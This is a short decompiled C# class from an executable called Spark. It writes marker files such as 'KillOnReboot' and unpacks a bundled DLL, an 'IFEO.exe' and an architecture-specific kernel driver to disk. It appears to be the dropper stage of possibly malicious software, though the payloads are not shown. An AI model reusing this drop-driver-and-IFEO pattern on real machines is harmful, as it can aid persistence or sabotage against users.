// Decompiled with JetBrains decompiler
// Type: Spark.Files
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

using Spark.Properties;
using System.IO;

#nullable disable
namespace Spark;

internal class Files
{
  public static void Initialised() => File.Create(Variables.FilePath + "\\Initialised");

  public static void KillOnReboot() => File.Create(Variables.FilePath + "\\KillOnReboot");

  public static void UnpackFiles()
  {
    Directory.CreateDirectory(Variables.FilePath);
    File.WriteAllBytes(Variables.FilePath + "\\DLL.dll", Resources.DLL);
    File.WriteAllBytes(Variables.FilePath + "\\IFEO.exe", Resources.IFEO);
    if (Variables.x64)
      File.WriteAllBytes(Variables.FilePath + "\\Driver.sys", Resources.Driver_x64);
    else
      File.WriteAllBytes(Variables.FilePath + "\\Driver.sys", Resources.Driver_x86);
  }
}
